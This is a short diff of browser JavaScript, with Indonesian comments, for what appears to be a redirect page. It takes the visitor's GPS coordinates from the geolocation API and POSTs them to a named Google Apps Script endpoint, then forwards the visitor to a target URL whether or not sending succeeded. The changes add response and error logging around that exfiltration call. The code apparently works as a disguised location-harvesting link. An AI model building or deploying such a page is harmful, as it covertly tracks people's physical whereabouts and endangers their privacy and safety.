@@ -9,7 +9,6 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      // Kirim ke Google Apps Script kamu
       fetch('https://script.google.com/macros/s/AKfycbzOGqGyILelvwLKqhavkSfgMq6zXMrtQyRUjEr3gDCFzj7h23LDebSY__czSvdIde7K/exec', {
         method: 'POST',
         body: JSON.stringify({
@@ -20,14 +19,21 @@
         headers: {
           'Content-Type': 'application/json'
         }
-      }).finally(() => {
-        // Setelah dikirim, redirect ke halaman target
+      })
+      .then(response => response.text())
+      .then(text => {
+        console.log("Response from GAS:", text);
+      })
+      .catch(error => {
+        console.error("Error sending location:", error);
+      })
+      .finally(() => {
+        // Redirect tetap dilakukan walau error
         window.location.href = targetURL;
       });
     }
 
     function handleError() {
-      // Jika gagal ambil lokasi, tetap redirect
       window.location.href = targetURL;
     }
 
